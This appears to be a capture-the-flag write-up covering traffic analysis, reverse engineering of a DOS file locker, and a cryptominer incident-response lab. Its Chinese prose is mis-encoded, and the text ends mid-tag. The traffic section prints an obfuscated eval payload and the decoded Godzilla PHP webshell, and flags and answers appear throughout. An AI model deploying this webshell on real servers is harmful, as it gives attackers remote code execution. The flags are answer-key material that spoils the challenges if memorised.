    <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><p>æŸ¥çœ‹æµé‡åŒ…å†…å®¹å‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pass=<span class="hljs-keyword">eval</span>%<span class="hljs-number">28</span>base64_decode%<span class="hljs-number">28</span>strrev%<span class="hljs-number">28</span>urldecode%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7ciMhZ2MxImM2MzY0QjZmVGMn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cyYkV2M4N3dyoXYxFzJ9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B&amp;<span class="hljs-number">1</span>qaz2wsx3edc=eu1uNDRjMzYyYjz%<span class="hljs-number">2</span>Bu2uwAH1mNsWC9MvudxUD4GxD2vZHYhmcslPc4AT6kvwn72TiprEftRcyZvWaASZ2twUSoSXCZHZrgXp1OrZJTzbT5eJdLiAUCd1%<span class="hljs-number">2</span>BqUmpgl2Orlfucw%<span class="hljs-number">2</span>BsWVNIRc8GzsXv8ODt4jV5jXn%<span class="hljs-number">2</span>FLQCpCbmD2OihJd4HtL0BEOlzQGrMYUiFNRFgou2Zmus5JThj7ts0VATS5%<span class="hljs-number">2</span>FBmZjQ%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>è§£å¯† webshell å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br><br>data = <span class="hljs-string">&quot;K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7ciMhZ2MxImM2MzY0QjZmVGMn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cyYkV2M4N3dyoXYxFzJ9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD&quot;</span><br>decoded = base64.b64decode(data[::-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(decoded.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°çš„æ˜¯å“¥æ–¯æ‹‰æµé‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;1qaz2wsx3edc&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;0eff44c362b13fa2&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Cyber è§£å¯†</p><p><img src="https://img.dkdun.cn/v1/2025/12/38ea55dbce7a8e4f.png"></p><p>å°†å¯†æ–‡æå–å‡ºæ¥ base64 è§£å¯†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;ccebdb78-<span class="hljs-number">4</span>b5c-<span class="hljs-number">4252</span>-b20a-<span class="hljs-number">0039913</span>c5c94&#125;<br></code></pre></td></tr></table></figure><h1 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h1><p>ida çœ‹æ±‡ç¼–æµç¨‹</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">æ–‡ä»¶å¤´å†™ <span class="hljs-string">&quot;ZX_LOCK&quot;</span> å’Œä¸€ä¸ªå­—èŠ‚ï¼ˆå–å†³äº word_<span class="hljs-number">1023</span>E &amp; <span class="hljs-number">1</span>ï¼‰<br>è·å–ç³»ç»Ÿæ—¶é’Ÿ <span class="hljs-comment">(int 1Ah)</span>ï¼Œå¾—åˆ°ä¸€ä¸ª seed <span class="hljs-comment">(di)</span><br>ä» FLAG.TXT è¯»åˆ° u<span class="hljs-symbol">nk_1012</span>Aï¼Œå¯¹æ¯ä¸¤ä¸ªå­—èŠ‚æ‰§è¡Œä¸€ç³»åˆ—åŠ å¯†å˜æ¢<br>æŠŠ seed <span class="hljs-comment">(word_1022A)</span> å’ŒåŠ å¯†åçš„æ•°æ®å†™å…¥ FLAG.E<span class="hljs-symbol">NC</span><br></code></pre></td></tr></table></figure><p>gpt ç§’äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, seed: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br><br>    result = <span class="hljs-built_in">bytearray</span>()<br>    di = seed<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">2</span>):<br>        ax = <span class="hljs-built_in">int</span>.from_bytes(data[i:i+<span class="hljs-number">2</span>], <span class="hljs-string">&quot;little&quot;</span>)<br>        di = (di + <span class="hljs-number">0xFADE</span>) &amp; <span class="hljs-number">0xFFFF</span><br>        cx = ax &amp; di<br>        cx = (~cx) &amp; <span class="hljs-number">0xFFFF</span><br>        dx = ax &amp; cx<br>        dx = (~dx) &amp; <span class="hljs-number">0xFFFF</span><br>        tmp_ax = dx<br>        dx = di &amp; cx<br>        dx = (~dx) &amp; <span class="hljs-number">0xFFFF</span><br>        tmp_ax = tmp_ax &amp; dx<br>        tmp_ax = (~tmp_ax) &amp; <span class="hljs-number">0xFFFF</span><br>        result.extend(tmp_ax.to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;little&quot;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_flag_enc</span>(<span class="hljs-params">filename=<span class="hljs-string">&quot;FLAG.ENC&quot;</span></span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        content = f.read()<br><br>    <span class="hljs-keyword">assert</span> content.startswith(<span class="hljs-string">b&quot;ZX_LOCK&quot;</span>)<br>    mode = content[<span class="hljs-number">7</span>]<br>    seed = <span class="hljs-built_in">int</span>.from_bytes(content[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-string">&quot;little&quot;</span>)<br>    enc_data = content[<span class="hljs-number">10</span>:]<br><br>    dec = decrypt(enc_data, seed)<br><br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> dec[-<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<br>        dec = dec[:-<span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">return</span> dec.decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    flag = parse_flag_enc(<span class="hljs-string">&quot;FLAG.ENC&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted FLAG:&quot;</span>, flag)<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">flag&#123;D0s_L0ck3r_WitH_n4Nd_ExpRs!<span class="hljs-string">|solarsec_202509&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ç‰¹æ´›ä¼ŠæŒ–çŸ¿æœ¨é©¬äº‹ä»¶æ’æŸ¥"><a href="#ç‰¹æ´›ä¼ŠæŒ–çŸ¿æœ¨é©¬äº‹ä»¶æ’æŸ¥" class="headerlink" title="ç‰¹æ´›ä¼ŠæŒ–çŸ¿æœ¨é©¬äº‹ä»¶æ’æŸ¥"></a>ç‰¹æ´›ä¼ŠæŒ–çŸ¿æœ¨é©¬äº‹ä»¶æ’æŸ¥</h1><h2 id="ä»»åŠ¡ä¸€"><a href="#ä»»åŠ¡ä¸€" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ä»»åŠ¡åç§°ï¼šæäº¤æŒ–çŸ¿æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span><br><span class="language-xml">ä»»åŠ¡åˆ†æ•°ï¼š100.00</span><br><span class="language-xml">ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag</span><br><span class="language-xml">æäº¤æŒ–çŸ¿æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œæœ€ç»ˆä»¥flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">xxx</span>/xxx&#125;</span><span class="language-xml">æ ¼å¼æäº¤</span><br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾ CPU å ç”¨ç‡é¡ºåº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux --<span class="hljs-built_in">sort</span>=-%cpu | <span class="hljs-built_in">head</span> -20<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c9a46f60adaf983a.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">tmp</span>/kworkerds&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ä»»åŠ¡äºŒ"><a href="#ä»»åŠ¡äºŒ" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm">ä»»åŠ¡åç§°ï¼šæäº¤æŒ–çŸ¿æ–‡ä»¶çš„å¤–è”<span class="hljs-built_in">IP</span>ä¸ç«¯å£<br>ä»»åŠ¡åˆ†æ•°ï¼š<span class="hljs-number">100</span>.<span class="hljs-number">00</span><br>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag<br>æäº¤æŒ–çŸ¿æ–‡ä»¶çš„å¤–è”çš„<span class="hljs-built_in">IP</span>ä¸ç«¯å£ï¼Œæœ€ç»ˆä»¥flag&#123;<span class="hljs-built_in">ip</span>:port&#125;æ ¼å¼æäº¤<br></code></pre></td></tr></table></figure><p>æ ¹æ® PID æŸ¥æ‰¾å¤–è”</p><p><img src="https://img.dkdun.cn/v1/2025/12/c99181bfdf854fcd.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">104.21.6.99:10235</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä»»åŠ¡ä¸‰"><a href="#ä»»åŠ¡ä¸‰" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">ä»»åŠ¡åç§°ï¼šå®ˆæŠ¤è¿›ç¨‹è„šæœ¬çš„ç»å¯¹è·¯å¾„<br>ä»»åŠ¡åˆ†æ•°ï¼š<span class="hljs-number">100.00</span><br>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag<br>åœæ­¢æŒ–çŸ¿è¿›ç¨‹å¹¶å°è¯•åˆ é™¤æŒ–çŸ¿ç¨‹åºï¼Œæ ¹æ®å¼‚å¸¸åˆ¤æ–­ï¼Œæäº¤å®ˆæŠ¤è¿›ç¨‹è„šæœ¬çš„ç»å¯¹è·¯å¾„ï¼Œæœ€ç»ˆä»¥flag&#123;<span class="hljs-regexp">/xxx/</span>xxx<span class="hljs-regexp">/xxx/</span>xxx&#125;æäº¤<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ &#x2F;etc&#x2F;cron.d ç›®å½•ä¸‹æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/5a6998bffdc2d847.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">usr</span>/bin/.0guardian&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ä»»åŠ¡å››"><a href="#ä»»åŠ¡å››" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">ä»»åŠ¡åç§°ï¼šå¼‚å¸¸å¤„ç†<br>ä»»åŠ¡åˆ†æ•°ï¼š<span class="hljs-number">100.00</span><br>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag<br>æ ¹æ®å‡ºç°çš„å¼‚å¸¸åŠå®ˆæŠ¤è¿›ç¨‹è„šæœ¬ï¼Œç»§ç»­æ’æŸ¥ï¼Œä»¥äººä¸ºæœ¬ï¼Œä½¿ç”¨ç¯å¢ƒå†…æµè§ˆå™¨è®¿é—®ï¼šhttp:<span class="hljs-regexp">//</span>chat.internal-dev.net:<span class="hljs-number">8081</span> è·å–å¯ç–‘ç½‘å€ï¼Œæœ€ç»ˆä»¥flag&#123;http:<span class="hljs-regexp">//</span>www.example.com&#125;æ ¼å¼æäº¤<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8c5850344710c382.png"></p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">flag&#123;<span class="hljs-attribute">http</span>://www<span class="hljs-variable">.superlog-pro</span><span class="hljs-variable">.com</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä»»åŠ¡äº”"><a href="#ä»»åŠ¡äº”" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">ä»»åŠ¡åç§°ï¼šåˆ†æç—…æ¯’æ–‡ä»¶<br>ä»»åŠ¡åˆ†æ•°ï¼š<span class="hljs-number">100.00</span><br>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag<br>åˆ†æç—…æ¯’æ–‡ä»¶ï¼Œæäº¤å…¶æ„ŸæŸ“çš„æ‰€æœ‰ç¨‹åºï¼Œæœ€ç»ˆä»¥flag&#123;md5(<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/whoai,/u</span>sr<span class="hljs-regexp">/bin/</span>ls,<span class="hljs-regexp">/usr/</span>bin/top)&#125;è¿›è¡Œæäº¤ï¼Œé¡ºåºéœ€ä»¥ç—…æ¯’æ–‡ä»¶ä¸­ä¸ºå‡†<br></code></pre></td></tr></table></figure><p>æ ¹æ®ç½‘ç«™ï¼Œåœ¨æµè§ˆå™¨æ‰¾åˆ°ä¸‹è½½çš„ç¨‹åº</p><p><img src="https://img.dkdun.cn/v1/2025/12/baa6212da15e8df0.png"></p><p>æŸ¥æ‰¾ç¨‹åºä¸­çš„å­—ç¬¦ä¸²</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings setup<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°å¦‚ä¸‹ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/ls,/bin/ps,/bin/cat,/bin/rm,/bin/ss,/usr/bin/stat,/usr/bin/top,/usr/bin/wget,/usr/bin/curl,/usr/bin/vi,/usr/bin/sudo<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/dfdc24a567a7b984.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;dac48e98a53b81b0218e2156e364f7ba&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ä»»åŠ¡å…­"><a href="#ä»»åŠ¡å…­" class="headerlink" title="ä»»åŠ¡å…­"></a>ä»»åŠ¡å…­</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs groovy">ä»»åŠ¡åç§°ï¼šä¿®å¤ç³»ç»Ÿå¹¶æ¢å¤æ–‡ä»¶å®Œæ•´æ€§<br>ä»»åŠ¡åˆ†æ•°ï¼š<span class="hljs-number">100.00</span><br>ä»»åŠ¡ç±»å‹ï¼šé™æ€Flag<br>ä¿®å¤ç³»ç»Ÿå¹¶æ¢å¤æ–‡ä»¶å®Œæ•´æ€§ï¼šå·²çŸ¥æ‰€æœ‰ç¨‹åºè¢«æ„ŸæŸ“ï¼Œå½“å‰ç³»ç»Ÿå±äºæ–­ç½‘çŠ¶æ€ï¼Œæ‰€ä»¥ä½œè€…è´´å¿ƒçš„åœ¨<span class="hljs-regexp">/deb_finalç›®å½•ä¸‹å­˜æ”¾äº†å¯¹åº”ç¨‹åºçš„debåŒ…ï¼Œè¯·å°è¯•æ¢å¤æ‰€æœ‰ç¨‹åºï¼Œæ¢å¤å®Œæ¯•ååœ¨/</span><span class="hljs-keyword">var</span><span class="hljs-regexp">/flag/</span><span class="hljs-number">1</span>æ–‡ä»¶è·å–flag<br></code></pre></td></tr></table></figure><p>è¦†ç›–å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpkg -i --force-confnew /deb_final/*.deb || <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d30860b70736d7db.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;e<span class="hljs-number">510</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span>fca<span class="hljs-number">680</span>b<span class="hljs-number">1</span>b<span class="hljs-number">4</span>bd<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">8</span>d<span class="hljs-number">6</span>b<span class="hljs-number">3</span>f<span class="hljs-number">4</span>bdc&#125;<br></code></pre></td></tr></table></figure><h2 id="ä»»åŠ¡ä¸ƒ"><a href="#ä»»åŠ¡ä¸ƒ" class="headerlink" title="ä»»åŠ¡ä¸ƒ"></a>ä»»åŠ¡ä¸ƒ</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">ä»»åŠ¡åç§°ï¼šæœ€ç»ˆæ¸…ç†<br>ä»»åŠ¡åˆ†æ•°ï¼š<span class="hljs-number">100.00</span><br>ä»»åŠ¡ç±»å‹ï¼šé™æ€<span class="hljs-built_in">Flag</span><br>æœ€ç»ˆæ¸…ç†ï¼šåˆ é™¤æŒ–çŸ¿ç¨‹åºã€åˆ é™¤è®¡åˆ’ä»»åŠ¡åŠå®ˆæŠ¤è¿›ç¨‹åŠæ¸…é™¤ç›¸å…³è¿›ç¨‹ï¼Œç­‰å¾…ç‰‡åˆ»åœ¨/var/<span class="hljs-built_in">flag</span>/<span 